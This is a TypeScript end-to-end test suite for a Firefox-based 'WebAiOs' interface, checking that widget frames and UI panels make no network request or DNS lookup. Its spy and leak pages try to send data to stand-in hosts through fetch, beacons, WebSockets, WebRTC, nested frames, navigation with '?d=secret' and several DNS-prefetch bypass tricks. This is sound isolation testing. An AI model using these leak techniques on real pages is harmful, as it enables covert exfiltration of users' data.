import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { mkdtemp, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { APPS_ENV, appWindowExpr, launchEssai, writeProject } from "./apps";
import { dispatch, state, waitFor, waitReady } from "./firefox";
import { launchWebAiOs, type LaunchedWebAiOs } from "./launch";
import type { Marionette } from "./marionette";
import { callTool } from "./mcp";
import { grantSite, siteWindowExpr, writeSite } from "./sites";
import { consoleWith, DATA_PNG, NET_PREFS, netEnv, resolvedNames, rtcPage, SFX, startNetWitness, testPages, uiRefusals, widgetFiles } from "./ui-network";

// The UI's network (spec 2026-11-08-webaios-firefox-reseau-interfaces-design.md): nothing the UI shows reaches a server
// or makes a name resolve. One launch for the file. Ports: 15365 (HTTP/WS, logged by host), 15366 (TCP counter: fake
// TURN), 15367 (UDP counter: fake STUN), 15370-15374 (agent apps). The zero counters are the acceptance.

const HTTP = 15365;
const STORE = "chrome://browser/content/webaios/store.sys.mjs";
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const host = (name: string) => `${name}.${SFX}:${HTTP}`;

/** Electron's AFFICHAGE (accueil.spec.ts): shows the data it receives. No `e.source !== parent` test: in a sandboxed frame it is not parent (accueil.e2e.ts). */
const DISPLAY = `<!doctype html><meta charset="utf-8">
<pre id="donnees"></pre><span id="statut"></span> <span id="messages">0</span>
<script>
  let n = 0;
  addEventListener("message", (e) => {
    if (!e.data || e.data.type !== "widget") return;
    n++;
    document.getElementById("donnees").textContent = JSON.stringify(e.data.donnees);
    document.getElementById("statut").textContent = e.data.etat.statut;
    document.getElementById("messages").textContent = String(n);
  });
</script>`;

/** Electron's codeRtc (accueil.spec.ts): an offer to a fake TURN/TCP and STUN/UDP; writes its result with `note`. */
const rtcCode = (tag: string, note: string) => `try {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: "turn:${tag}-turn.${SFX}:15366?transport=tcp", username: "SECRET", credential: "x" }, { urls: "stun:${tag}-stun.${SFX}:15367" }] });
  pc.createDataChannel("x");
  pc.createOffer().then((o) => pc.setLocalDescription(o));
  ${note}("lancé");
} catch (e) { ${note}("erreur " + e.name); }`;

/** Electron's spy display (accueil.spec.ts:718), its addresses under espion.<SFX>. */
function spyDisplay(): string {
  const a = `http://${host("espion")}`;
  const inFrame = `<script>const noter = (t) => parent.postMessage({ imbrique: t }, "*"); ${rtcCode("espion-imbrique", "noter")}</script>`;
  const asString = (t: string) => JSON.stringify(t).replace(/<\//g, "<\\/");
  return `<!doctype html><meta charset="utf-8"><p id="rtc">…</p><p id="imbrique">…</p><p id="js">…</p><p id="vide">…</p>
<script>
  const note = (id, t) => (document.getElementById(id).textContent = t);
  const essai = (f) => { try { f(); } catch {} };
  essai(() => fetch(${JSON.stringify(`${a}/espion-fetch`)}).catch(() => {}));
  essai(() => navigator.sendBeacon(${JSON.stringify(`${a}/espion-balise`)}, "x"));
  essai(() => new WebSocket(${JSON.stringify(`ws://${host("espion-ws")}/espion-ws`)}));
  essai(() => { const i = new Image(); i.src = ${JSON.stringify(`${a}/espion-image`)}; document.body.append(i); });
  essai(() => document.body.insertAdjacentHTML("beforeend", '<img src="${a}/espion-img">'));
  essai(() => document.body.insertAdjacentHTML("beforeend", "<" + 'link rel="prefetch" href="${a}/espion-prefetch">'));
  ${rtcCode("espion", "((t) => note('rtc', t))")}
  addEventListener("message", (e) => { if (e.data && e.data.imbrique) note("imbrique", e.data.imbrique); });
  const s = document.createElement("iframe");
  s.srcdoc = ${asString(inFrame)};
  document.body.append(s);
  const j = document.createElement("iframe");
  try { j.setAttribute("src", "javascript:" + encodeURIComponent(${asString(inFrame)})); note("js", "posé"); } catch (e) { note("js", "erreur " + e.name); }
  document.body.append(j);
  const v = document.createElement("iframe");
  document.body.append(v);
  try { note("vide", typeof v.contentWindow.RTCPeerConnection); } catch (e) { note("vide", "erreur " + e.name); }
</script>`;
}

/** The spikes' loadsWidget: a static web frame, a child navigated to the web, a frame through about:blank, then itself. */
const framesDisplay = `<!doctype html><meta charset="utf-8"><title>cadres</title><p id="t">cadres</p>
<iframe src="http://${host("fuite-sfr")}/fuite/sfr"></iframe>
<script>
const f = document.createElement("iframe");
document.body.append(f);
try { f.contentWindow.location.href = "http://${host("fuite-nav")}/fuite/nav"; } catch (e) { document.getElementById("t").dataset.nav = String(e).slice(0, 80); }
const b = document.createElement("iframe");
document.body.append(b);
try { const i = b.contentDocument.createElement("iframe"); i.src = "http://${host("fuite-bfr")}/fuite/bfr"; b.contentDocument.body.append(i); } catch (e) { document.getElementById("t").dataset.bfr = String(e).slice(0, 80); }
setTimeout(() => { try { location.href = "http://${host("fuite-self")}/fuite/self"; } catch (e) { document.getElementById("t").dataset.self = String(e).slice(0, 80); } }, 1500);
</script>`;

/** An unguarded opaque page (no CSP, no guard): every kind of load of the spikes' S2, under tp-<kind>. */
const loadsPage = `<!doctype html><meta charset="utf-8"><title>tp</title><p class="f">tp</p>
<style>@font-face { font-family: tp; src: url(http://${host("tp-font")}/tp/font); } .f { font-family: tp; }</style>
<img src="http://${host("tp-img")}/tp/img">
<div style="width:4px;height:4px;background-image:url(http://${host("tp-bg")}/tp/bg)"></div>
<iframe src="http://${host("tp-frame")}/tp/frame"></iframe>
<script>
fetch("http://${host("tp-fetch")}/tp/fetch").catch(() => {});
try { new WebSocket("ws://${host("tp-ws")}/tp/ws"); } catch (e) {}
try { navigator.sendBeacon("http://${host("tp-beacon")}/tp/beacon", "x"); } catch (e) {}
const f = document.createElement("iframe");
document.body.append(f);
try { f.contentWindow.location.href = "http://${host("tp-nav")}/tp/nav"; } catch (e) {}
</script>`;

/** accueil.spec.ts:810's display that writes network hints by script: each attempt's outcome in #r. */
const dnsScriptDisplay = `<!doctype html><meta charset="utf-8"><p id="r"></p><script>
  const L = "<" + "link";
  const r = [];
  const essai = (nom, f) => { try { f(); r.push(nom + ":passé"); } catch (e) { r.push(nom + ":" + e.name); } };
  essai("create", () => { const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//create.${SFX}"; document.head.append(l); });
  essai("inner", () => { document.body.innerHTML += L + ' rel="dns-prefetch" href="//inner.${SFX}">'; });
  essai("srcdoc", () => { const f = document.createElement("iframe"); f.srcdoc = L + ' rel=dns-prefetch href=//srcdoc.${SFX}>'; document.body.append(f); });
  essai("meta", () => { const m = document.createElement("meta"); m.httpEquiv = "x-dns-prefetch-control"; m.content = "on"; document.head.append(m); });
  essai("image", () => { const i = new Image(); i.src = "https://image.${SFX}/i.png"; document.body.append(i); });
  essai("ancre", () => { document.body.insertAdjacentHTML("beforeend", '<a href="https://ancre2.${SFX}/">a</a>'); });
  const XHTML = "http://www.w3.org/1999/xhtml";
  essai("createDocument", () => { const d = document.implementation.createDocument(XHTML, "li" + "nk", null); const l = document.adoptNode(d.documentElement); l.setAttribute("rel", "dns-prefetch"); l.setAttribute("href", "//createdoc.${SFX}"); document.head.append(l); });
  essai("importNode", () => { const d = document.implementation.createDocument(XHTML, "li" + "nk", null); const l = document.importNode(d.documentElement); l.rel = "preconnect"; l.href = "https://import.${SFX}/"; document.head.appendChild(l); });
  essai("htmlDocument", () => { const d = document.implementation.createHTMLDocument(""); const l = d.createElement("li" + "nk"); l.rel = "dns-prefetch"; l.href = "//htmldoc.${SFX}"; document.head.append(document.adoptNode(l)); });
  essai("fragment", () => { const d = document.implementation.createDocument(XHTML, "li" + "nk", null); const f = document.createDocumentFragment(); const p = document.createElement("p"); p.appendChild(document.adoptNode(d.documentElement)); f.append(p); p.firstChild.setAttribute("rel", "dns-prefetch"); p.firstChild.setAttribute("href", "//fragment.${SFX}"); document.body.append(f); });
  essai("execCommand", () => { const d = document.createElement("div"); d.contentEditable = "true"; document.body.append(d); d.focus(); document.execCommand("insertHTML", false, L + " rel=dns-prefetch href=//exec.${SFX}>"); });
  essai("srcdocEntites", () => { const f = document.createElement("iframe"); f.srcdoc = "<iframe srcdoc='&#38;lt;" + "link rel=dns-prefetch href=//srcdoc-dyn.${SFX}>'></iframe>"; document.body.append(f); });
  document.getElementById("r").textContent = r.join(" ");
</script>`;

/** dns-script's outcomes under the Firefox guard. */
const DNS_SCRIPT =
  "create:TypeError inner:TypeError srcdoc:TypeError meta:TypeError image:passé ancre:passé createDocument:TypeError importNode:TypeError htmlDocument:TypeError fragment:TypeError execCommand:TypeError srcdocEntites:TypeError";

/**
 * Links a person presses: #l opens its address in a tab through webaiosOuvrir (the click handler), #p is a plain link,
 * #s an SVG link. The display's own capture listener tries to stop every mousedown before the chrome sees it.
 */
const linksDisplay = `<!doctype html><meta charset="utf-8"><title>lien</title>
<p><a id="l" href="http://md.${SFX}:15366/" style="display:inline-block;font-size:20px;padding:4px">ouvrir</a>
<a id="p" href="http://${host("plain")}/plain" style="display:inline-block;font-size:20px;padding:4px">simple</a></p>
<svg width="160" height="30"><a id="s" href="http://md-svg.${SFX}:15366/"><text x="4" y="22" font-size="20">svg svg svg</text></a></svg>
<script>
  addEventListener("mousedown", (e) => e.stopImmediatePropagation(), true);
  const l = document.getElementById("l");
  l.addEventListener("click", (e) => { e.preventDefault(); l.dataset.clicks = String(Number(l.dataset.clicks || 0) + 1); webaiosOuvrir("http://${host("ouvert")}/ouvert"); });
</script>`;

describe("the UI's network", () => {
  let w: LaunchedWebAiOs;
  let m: Marionette;
  let dataDir: string;
  let logDir: string;
  let pages: string;
  let net: Awaited<ReturnType<typeof startNetWitness>>;

  const names = () => resolvedNames(logDir);
  /** A frame `<iframe sandbox="allow-scripts">` appended to the sidebar on `src`; resolves once its document is `src`. */
  const sidebarFrame = (id: string, src: string) =>
    m.execute(
      `return (async () => { const sb = document.getElementById("webaios-sidebar").contentDocument;
       const f = sb.createElement("iframe"); f.id = arguments[0]; f.setAttribute("sandbox", "allow-scripts"); f.style.cssText = "width:20px;height:20px;border:0";
       sb.body.append(f); f.setAttribute("src", arguments[1]);
       for (let i = 0; i < 100 && f.contentDocument?.documentURI !== arguments[1]; i++) await new Promise((r) => setTimeout(r, 50));
       return f.contentDocument?.documentURI; })();`,
      [id, src],
    );
  const widgetDoc = (id: string) => `document.getElementById("webaios-sidebar").contentDocument.querySelector('[data-testid="widget-${id}"] iframe')?.contentDocument`;
  const widgetFrame = (id: string) => `document.getElementById("webaios-sidebar").contentDocument.querySelector('[data-testid="widget-${id}"] iframe')`;
  /** A frame's cut, read on its docShell: { dns: allowDNSPrefetch, mail: appType is APP_TYPE_MAIL, uri: its document }. */
  const CUT = `const cut = (el) => { const ds = el?.frameLoader?.docShell; return ds ? { dns: ds.allowDNSPrefetch, mail: ds.appType === Ci.nsIDocShell.APP_TYPE_MAIL, uri: el.contentDocument?.documentURI } : null; };`;
  const tcpSince = (n: number) => net.tcp.length - n;
  /**
   * A trusted press (synthesizeMouseEvent from the sidebar, as a person's) on `sel` in widget `id`'s display, released on
   * the same point (a click) or away from it (no click). Returns the sidebar's element under the point.
   */
  const press = (id: string, sel: string, click: boolean) =>
    m.execute<string | null>(
      `return (async () => { const sb = document.getElementById("webaios-sidebar"), ui = sb.contentWindow, f = ${widgetFrame(id)};
       f.scrollIntoView({ block: "center" });
       await new Promise((r) => ui.requestAnimationFrame(r));
       const el = f.contentDocument.querySelector(arguments[0]);
       const r = f.getBoundingClientRect(), q = el.getBoundingClientRect();
       const x = r.left + q.left + Math.min(10, q.width / 2), y = r.top + q.top + q.height / 2;
       const hit = sb.contentDocument.elementFromPoint(x, y)?.localName ?? null;
       ui.synthesizeMouseEvent("mousedown", x, y, { button: 0, clickCount: 1 });
       if (arguments[1]) ui.synthesizeMouseEvent("mouseup", x, y, { button: 0, clickCount: 1 });
       else ui.synthesizeMouseEvent("mouseup", 2, 2, { button: 0, clickCount: 1 });
       return hit; })();`,
      [sel, click],
    );
  const tabUrls = async () => Object.values((await state(m)).onglets).map((o) => o.url);
  /** Closes the tab whose address contains `part` (its opening hid the home), then waits for widget `id` again. */
  async function closeTab(part: string, id: string): Promise<void> {
    const tab = Object.entries((await state(m)).onglets).find(([, o]) => o.url.includes(part))?.[0];
    expect(tab, part).toBeDefined();
    await dispatch(m, { type: "fermerOnglet", id: tab! });
    await expect.poll(() => m.execute(`return !!${widgetDoc(id)}?.body?.firstChild;`), { timeout: 15_000 }).toBe(true);
  }

  beforeAll(async () => {
    net = await startNetWitness({ http: HTTP, raw: 15366, udp: 15367 });
    dataDir = await mkdtemp(path.join(os.tmpdir(), "webaios-data-"));
    logDir = await mkdtemp(path.join(os.tmpdir(), "webaios-dnslog-"));
    pages = await mkdtemp(path.join(os.tmpdir(), "webaios-net-pages-"));
    writeFileSync(path.join(pages, "rtc.html"), rtcPage("rtcp"));
    writeFileSync(path.join(pages, "loads.html"), loadsPage);
    widgetFiles(dataDir, "espion", spyDisplay());
    // Electron's widgetsFuite: the display navigates itself to the server, or to data:.
    widgetFiles(dataDir, "fuite", DISPLAY.replace("</script>", `setTimeout(() => (location = ${JSON.stringify(`http://${host("fuite")}/fuite-navigation?d=secret`)}), 1500);</script>`), "reste");
    widgetFiles(dataDir, "fuite-data", DISPLAY.replace("</script>", `setTimeout(() => (location = "data:text/html,<pre id=donnees>pirate</pre>"), 1500);</script>`), "reste");
    widgetFiles(dataDir, "fuite-cadres", framesDisplay);
    // accueil.spec.ts:810: displays with hints in their HTML are served refused (the parser would come before any guard).
    widgetFiles(dataDir, "dns-statique", `<!doctype html><link rel="dns-prefetch" href="//statique.${SFX}"><link rel="preconnect" href="https://preco.${SFX}"><p id="ok">pas refusé</p>`);
    widgetFiles(dataDir, "dns-meta", `<!doctype html><meta http-equiv="x-dns-prefetch-control" content="on"><a href="https://ancre.${SFX}/">a</a><p id="ok">pas refusé</p>`);
    widgetFiles(dataDir, "dns-entites", `<!doctype html><iframe srcdoc="<iframe srcdoc='&#38;lt;link rel=dns-prefetch href=//entite.${SFX}>'></iframe>"></iframe><p id="ok">pas refusé</p>`);
    widgetFiles(dataDir, "dns-entites-hex", `<!doctype html><iframe srcdoc="&#x26;lt;link rel=dns-prefetch href=//entite-hex.${SFX}>"></iframe><p id="ok">pas refusé</p>`);
    widgetFiles(dataDir, "dns-script", dnsScriptDisplay);
    // A starter widget still shows.
    const starter = path.resolve(import.meta.dirname, "../../../packages/noyau/modeles/widgets/actus-tech");
    widgetFiles(dataDir, "actus-tech", readFileSync(path.join(starter, "affichage.html"), "utf8"), JSON.parse(readFileSync(path.join(starter, "exemple.json"), "utf8")));
    widgetFiles(dataDir, "sonde", DISPLAY);
    widgetFiles(dataDir, "lien", linksDisplay);
    writeProject(dataDir, "essai", { manifeste: {} });
    const netsite = { nom: "Netsite", adresse: `http://netsite.localhost:${HTTP}/page`, domaines: ["netsite.localhost"] };
    writeSite(dataDir, "netsite", { declaration: netsite });
    await grantSite(dataDir, "netsite", netsite);
    const withHome = { nom: "Netsite accueil", adresse: `http://netsite-accueil.localhost:${HTTP}/page`, domaines: ["netsite-accueil.localhost"] };
    writeSite(dataDir, "netsite-accueil", { declaration: withHome, fichiers: { "accueil/index.html": '<!doctype html><meta charset="utf-8"><p id="h">accueil</p>' } });
    await grantSite(dataDir, "netsite-accueil", withHome);
    w = await launchWebAiOs({ dataDir, prefs: NET_PREFS, env: { ...netEnv(logDir), WEBAIOS_TEST_ADRESSES_LOCALES: "1", ...APPS_ENV([15370, 15374]) } });
    m = w.marionette;
    await m.setContext("chrome");
    await waitReady(m);
    await testPages(m, pages);
  }, 120_000);
  afterAll(async () => {
    await w?.close();
    net?.close();
    for (const d of [dataDir, logDir, pages]) if (d) await rm(d, { recursive: true, force: true });
  });

  // accueil.spec.ts:718
  it("a widget display can reach no server (neither WebRTC TURN/TCP or STUN/UDP, nested frames included)", { timeout: 120_000 }, async () => {
    const spy = () =>
      m.execute<Record<string, string | null>>(
        `const d = ${widgetDoc("espion")}; if (!d) return {};
         const t = (id) => d.getElementById(id)?.textContent ?? null;
         return { rtc: t("rtc"), imbrique: t("imbrique"), js: t("js"), vide: t("vide"), srcdoc: d.querySelector("iframe[srcdoc]")?.contentDocument?.documentURI ?? null };`,
      );
    await expect.poll(async () => (await spy()).vide, { timeout: 20_000 }).toBe("erreur SecurityError");
    const data = (id: string) => m.execute<string | null>(`return ${widgetDoc(id)}?.getElementById("donnees")?.textContent ?? null;`);
    await expect.poll(() => data("fuite"), { timeout: 20_000 }).toBe('"reste"');
    await expect.poll(() => data("fuite-data"), { timeout: 10_000 }).toBe('"reste"');
    await expect.poll(() => m.execute(`return ${widgetDoc("fuite-cadres")}?.getElementById("t") ? true : false;`), { timeout: 10_000 }).toBe(true);
    await sleep(3000);
    expect(await spy()).toEqual({ rtc: "erreur TypeError", imbrique: "…", js: "posé", vide: "erreur SecurityError", srcdoc: "about:blank" });
    expect(await data("fuite")).toBe('"reste"');
    expect(await data("fuite-data")).toBe('"reste"');
    const uris = await m.execute<string[]>(
      `return ["espion", "fuite", "fuite-data", "fuite-cadres"].map((id) => document.getElementById("webaios-sidebar").contentDocument.querySelector('[data-testid="widget-' + id + '"] iframe')?.contentDocument?.documentURI ?? "none");`,
    );
    for (const u of uris) expect(u, "each widget frame stays on its copy").toMatch(/^resource:\/\/webaios-widget-/);
    expect(net.hits.filter((h) => /espion|fuite/.test(h.label + h.path)).map((h) => `${h.label} ${h.method} ${h.path}`)).toEqual([]);
    expect((await names()).filter((n) => /espion|fuite/.test(n)), "no name resolved").toEqual([]);
    expect(net.tcp.length, "TCP connections to the fake TURN").toBe(0);
    expect(net.udp.length, "UDP packets to the fake STUN").toBe(0);
  });

  // accueil.spec.ts:781
  it("the net: a UI document without the widget guard reaches no server by WebRTC", { timeout: 120_000 }, async () => {
    const tcp0 = net.tcp.length;
    const udp0 = net.udp.length;
    expect(await sidebarFrame("rtc-net", "resource://webaios-test-net/rtc.html")).toBe("resource://webaios-test-net/rtc.html");
    const result = () => m.execute<string | null>(`return document.getElementById("webaios-sidebar").contentDocument.getElementById("rtc-net")?.contentDocument?.getElementById("r")?.textContent ?? null;`);
    await expect.poll(result, { timeout: 30_000 }).toMatch(/^\[/);
    await sleep(3000);
    const [main, blank] = JSON.parse((await result())!) as { result?: string; ms?: number; error?: string }[];
    expect(main!.result, JSON.stringify(main)).toBe("NotAllowedError");
    expect(main!.ms, "refused at once").toBeLessThan(1000);
    expect(blank!.result ?? blank!.error, JSON.stringify(blank)).toMatch(/SecurityError|NotAllowedError/);
    expect(net.tcp.length - tcp0, "TCP connections to the fake TURN").toBe(0);
    expect(net.udp.length - udp0, "UDP packets to the fake STUN").toBe(0);
    expect((await names()).filter((n) => /^(turn|stun)-rtcp/.test(n))).toEqual([]);
  });

  it("the sidebar and the agent panel load nothing from the web: an <img> and a background-image in http, https or ws, even 127.0.0.1, are refused; a data: image shows", { timeout: 120_000 }, async () => {
    const widths = await m.execute<Record<string, number>>(
      `return (async () => { const out = {};
       for (const [tag, id] of [["sb", "webaios-sidebar"], ["ag", "webaios-agent"]]) {
         const d = document.getElementById(id).contentDocument;
         const u = (name, scheme = "http") => scheme + "://" + name + "." + arguments[0] + ":${HTTP}/" + name;
         for (const src of [u(tag + "-img"), u(tag + "-imgs", "https"), "http://127.0.0.1:${HTTP}/" + tag + "-local.png"]) { const i = d.createElement("img"); i.src = src; d.body.append(i); }
         const div = d.createElement("div"); div.style.cssText = "width:4px;height:4px;background-image:url(" + u(tag + "-bg") + ")"; d.body.append(div);
         try { new d.defaultView.WebSocket(u(tag + "-ws", "ws")); } catch (e) {}
         const ok = d.createElement("img"); ok.src = arguments[1]; d.body.append(ok);
         await new Promise((r) => (ok.complete ? r() : ok.addEventListener("load", r, { once: true })));
         out[tag] = ok.naturalWidth;
       }
       return out; })();`,
      [SFX, DATA_PNG],
    );
    expect(widths).toEqual({ sb: 1, ag: 1 });
    await sleep(3000);
    expect(net.hits.filter((h) => /^(sb|ag)-/.test(h.label) || /\/(sb|ag)-/.test(h.path)).map((h) => `${h.label} ${h.path}`)).toEqual([]);
    expect((await names()).filter((n) => /^(sb|ag)-/.test(n))).toEqual([]);
    const refusals = (await uiRefusals(m)).join("\n");
    for (const tag of ["sb", "ag"]) for (const what of [`${tag}-img.`, `${tag}-imgs.`, `127.0.0.1:${HTTP}/${tag}-local`, `${tag}-bg.`]) expect(refusals, what).toContain(what);
  });

  it("an unguarded opaque page in the sidebar loads nothing: fetch, WebSocket, sendBeacon, img, font, frame", { timeout: 120_000 }, async () => {
    expect(await sidebarFrame("loads-net", "resource://webaios-test-net/loads.html")).toBe("resource://webaios-test-net/loads.html");
    await sleep(3000);
    expect(net.hits.filter((h) => h.label.startsWith("tp-")).map((h) => `${h.label} ${h.method} ${h.path}`)).toEqual([]);
    // The policy refuses before the DNS (S2 p1).
    expect((await names()).filter((n) => n.startsWith("tp-"))).toEqual([]);
  });

  // accueil.spec.ts:810
  it("a widget display resolves no name (dns-prefetch, preconnect, x-dns-prefetch-control, image), nor does the sidebar through a link; a tab's navigation does", { timeout: 120_000 }, async () => {
    const tcp0 = net.tcp.length;
    const body = (id: string) => m.execute<string>(`return ${widgetDoc(id)}?.body?.textContent ?? "";`);
    for (const id of ["dns-statique", "dns-meta", "dns-entites", "dns-entites-hex"]) await expect.poll(() => body(id), { timeout: 20_000 }).toContain("Affichage refusé");
    await expect.poll(() => m.execute(`return ${widgetDoc("dns-script")}?.getElementById("r")?.textContent ?? "";`), { timeout: 10_000 }).toBe(DNS_SCRIPT);
    await expect.poll(() => m.execute(`return ${widgetDoc("actus-tech")}?.querySelector("#liste li")?.textContent ?? "";`), { timeout: 10_000 }).toContain("Un modèle de langage");
    // A link and a preconnect, inserted by the chrome, in a widget, its about:blank child and the sidebar.
    await m.execute(
      `return (async () => { const sb = document.getElementById("webaios-sidebar").contentDocument, wd = ${widgetDoc("sonde")};
       const blank = wd.createElement("iframe"); wd.body.append(blank);
       for (let i = 0; i < 40 && blank.contentDocument?.readyState !== "complete"; i++) await new Promise((r) => setTimeout(r, 50));
       const add = (doc, tag) => {
         const a = doc.createElement("a"); a.href = "http://preco-" + tag + "-a." + arguments[0] + ":15366/"; a.textContent = "a"; doc.body.append(a);
         const l = doc.createElement("link"); l.rel = "preconnect"; l.href = "http://preco-" + tag + "-l." + arguments[0] + ":15366"; (doc.head ?? doc.body).append(l);
       };
       add(wd, "wd"); add(blank.contentDocument, "wb"); add(sb, "sb"); })();`,
      [SFX],
    );
    // The witness: a tab's navigation resolves its name.
    await dispatch(m, { type: "ouvrirOnglet", fenetreId: (await state(m)).fenetres[0]!.id, url: `http://temoin.${SFX}:${HTTP}/`, activer: true });
    await expect.poll(() => net.hits.some((h) => h.label === "temoin"), { timeout: 15_000 }).toBe(true);
    await closeTab("temoin.", "sonde");
    await sleep(3000);
    expect({ names: await names(), tcp: tcpSince(tcp0) }).toEqual({ names: ["temoin"], tcp: 0 });
  });

  it("the five UI frames are cut before they load", { timeout: 120_000 }, async () => {
    await expect.poll(() => existsSync(path.join(dataDir, "espace", ".webaios", "mcp.json")), { timeout: 15_000 }).toBe(true);
    await launchEssai(dataDir);
    await m.execute(`return (async () => { const store = await ChromeUtils.importESModule("${STORE}").ready; await store.agent.request("sites.agir", { id: "netsite", action: "ouvrir", fenetre: store.state.fenetres[0].id }); })();`);
    const frames = () =>
      m.execute(
        `${CUT} const site = ${siteWindowExpr("netsite")}, app = ${appWindowExpr("essai")};
         return { sidebar: cut(document.getElementById("webaios-sidebar")), agent: cut(document.getElementById("webaios-agent")), bar: cut(site?.document.getElementById("webaios-site-bar")),
                  badge: cut(app?.document.getElementById("webaios-app-badge")), drag: document.getElementById("webaios-sidebar").contentWindow.docShell.windowDraggingAllowed };`,
      );
    const page = (p: string) => ({ dns: false, mail: true, uri: `chrome://browser/content/webaios/${p}` });
    await expect.poll(frames, { timeout: 20_000 }).toEqual({ sidebar: page("sidebar.html"), agent: page("agent.html"), bar: page("sidebar.html?site=netsite"), badge: page("sidebar.html?pastille=app%3Aessai"), drag: true });
  });

  it("the badge and the site bar are cut; their loads are refused", { timeout: 60_000 }, async () => {
    const badge = `${appWindowExpr("essai")}.document.getElementById("webaios-app-badge")`;
    const size = () => m.execute<number[]>(`const r = ${badge}.getBoundingClientRect(); return [r.width, r.height];`);
    await expect.poll(() => m.execute(`return !!${badge}.contentDocument.querySelector('[data-testid="pastille-webaios"]');`), { timeout: 15_000 }).toBe(true);
    // 88×28: 48×28 and the agent's access button (apps-badge.e2e.ts).
    await expect.poll(size, { timeout: 10_000 }).toEqual([88, 28]);
    await m.execute(
      `for (const [tag, d] of [["bar", ${siteWindowExpr("netsite")}.document.getElementById("webaios-site-bar").contentDocument], ["badge", ${badge}.contentDocument]]) {
         const i = d.createElement("img"); i.style.cssText = "position:absolute;width:1px;height:1px"; i.src = "http://" + tag + "-img." + arguments[0] + ":${HTTP}/" + tag + "-img.png"; d.body.append(i);
       }`,
      [SFX],
    );
    await sleep(3000);
    expect(net.hits.filter((h) => /^(bar|badge)-img/.test(h.label)).map((h) => `${h.label} ${h.path}`)).toEqual([]);
    expect((await names()).filter((n) => /^(bar|badge)-img/.test(n))).toEqual([]);
    const refusals = (await uiRefusals(m)).join("\n");
    for (const what of ["bar-img.", "badge-img."]) expect(refusals, what).toContain(what);
    expect(await size()).toEqual([88, 28]);
    await callTool(dataDir, "arreter_application", { dossier: "essai" }).catch(() => {});
    await m.execute(`return (async () => { const store = await ChromeUtils.importESModule("${STORE}").ready; for (const id of store.sites.openIds()) await store.sites.close(id); })();`);
  });

  it("a widget re-rendered or added after the sidebar loaded inherits the cut", { timeout: 120_000 }, async () => {
    const tcp0 = net.tcp.length;
    const src0 = await m.execute<string>(`return ${widgetFrame("sonde")}?.getAttribute("src");`);
    widgetFiles(dataDir, "sonde", DISPLAY.replace("<pre", '<p id="v2">v2</p><pre'));
    await expect.poll(() => m.execute(`return !!${widgetDoc("sonde")}?.getElementById("v2");`), { timeout: 20_000 }).toBe(true);
    expect(await m.execute(`return ${widgetFrame("sonde")}?.getAttribute("src");`)).not.toBe(src0);
    widgetFiles(dataDir, "tard", DISPLAY);
    await expect.poll(() => m.execute(`return !!${widgetDoc("tard")}?.getElementById("donnees");`), { timeout: 20_000 }).toBe(true);
    const dns = await m.execute(
      `const out = {};
       for (const id of ["sonde", "tard"]) {
         const f = document.getElementById("webaios-sidebar").contentDocument.querySelector('[data-testid="widget-' + id + '"] iframe'), d = f.contentDocument;
         const a = d.createElement("a"); a.href = "http://rr-" + id + "." + arguments[0] + ":15366/"; a.textContent = "rr"; d.body.append(a);
         out[id] = f.frameLoader.docShell.allowDNSPrefetch;
       }
       return out;`,
      [SFX],
    );
    expect(dns).toEqual({ sonde: false, tard: false });
    await sleep(3000);
    expect({ names: (await names()).filter((n) => n.startsWith("rr-")), tcp: tcpSince(tcp0) }).toEqual({ names: [], tcp: 0 });
  });

  it("a real press on a widget's link resolves no name and opens no connection; its click still opens the link in a tab", { timeout: 120_000 }, async () => {
    const tcp0 = net.tcp.length;
    await expect.poll(() => m.execute(`return !!${widgetDoc("lien")}?.getElementById("l");`), { timeout: 15_000 }).toBe(true);
    expect(await press("lien", "#l", true)).toBe("iframe");
    await expect.poll(() => net.hits.some((h) => h.label === "ouvert" && h.path === "/ouvert"), { timeout: 15_000 }).toBe(true);
    const opened = await tabUrls();
    await closeTab("/ouvert", "lien");
    expect(opened).toContain(`http://${host("ouvert")}/ouvert`);
    // An SVG link, pressed and released away from it.
    expect(await press("lien", "#s", false)).toBe("iframe");
    await sleep(3000);
    expect({ names: (await names()).filter((n) => n === "md" || n === "md-svg"), tcp: tcpSince(tcp0) }).toEqual({ names: [], tcp: 0 });
  });

  it("a plain link in a widget, clicked, leaves the frame on its copy", { timeout: 60_000 }, async () => {
    expect(await press("lien", "#p", true)).toBe("iframe");
    await sleep(3000);
    expect(net.hits.filter((h) => h.label === "plain")).toEqual([]);
    expect(await m.execute(`return ${widgetDoc("lien")}?.documentURI;`)).toMatch(/^resource:\/\/webaios-widget-lien\//);
    // Measured: the sidebar's CSP (frame-src resource:) refuses it before the content policy is asked.
    expect((await consoleWith(m, "plain.")).join("\n")).toMatch(/Content-Security-Policy.*plain\..*frame-src resource:/);
  });

  it("Enter on a focused widget link resolves no name, opens no connection, and opens a tab only by today's gesture rule", { timeout: 60_000 }, async () => {
    const tcp0 = net.tcp.length;
    // The last press is older than a gesture's 1.5 s.
    await sleep(2000);
    const enterOn = (sel: string) =>
      m.execute<string | null>(
        `const sb = document.getElementById("webaios-sidebar"), d = ${widgetDoc("lien")}, el = d.querySelector(arguments[0]);
         window.focus(); el.focus();
         const focused = d.activeElement?.id ?? null;
         const tip = Cc["@mozilla.org/text-input-processor;1"].createInstance(Ci.nsITextInputProcessor);
         tip.beginInputTransactionForTests(sb.contentWindow);
         const ev = new sb.contentWindow.KeyboardEvent("", { key: "Enter", code: "Enter" });
         tip.keydown(ev);
         tip.keyup(ev);
         return focused;`,
        [sel],
      );
    expect(await enterOn("#l")).toBe("l");
    await expect.poll(() => m.execute(`return ${widgetDoc("lien")}?.getElementById("l")?.dataset.clicks ?? "0";`), { timeout: 10_000 }).toBe("1");
    await expect.poll(async () => (await consoleWith(m, "lien de widget ignoré")).length, { timeout: 10_000 }).toBeGreaterThan(0);
    expect(await enterOn("#p")).toBe("p");
    await sleep(3000);
    expect((await tabUrls()).filter((u) => u.includes("/ouvert"))).toEqual([]);
    expect(net.hits.filter((h) => h.label === "plain")).toEqual([]);
    expect({ names: (await names()).filter((n) => n === "md" || n === "plain"), tcp: tcpSince(tcp0) }).toEqual({ names: [], tcp: 0 });
  });

  // The witness: a tab's link press still warms its connection (the guard never touches content).
  it("a press on a tab's link still warms up its connection", { timeout: 60_000 }, async () => {
    const tcp0 = net.tcp.length;
